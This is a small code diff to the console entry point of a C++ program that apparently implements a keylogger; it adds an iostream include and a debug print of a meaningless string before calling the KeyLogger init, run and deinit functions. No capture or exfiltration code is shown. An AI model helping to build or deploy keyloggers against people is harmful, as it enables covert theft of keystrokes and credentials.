@@ -1,9 +1,12 @@
 #include "KeyLogger.h"
 
+#include <iostream>
+
 #ifdef CONSOLE
 
 int main()
 {
+	std::cout << "DSAKJLDJLKSA" << std::endl;
 	KeyLogger::Init();
 	KeyLogger::Run();
 	KeyLogger::DeInit();
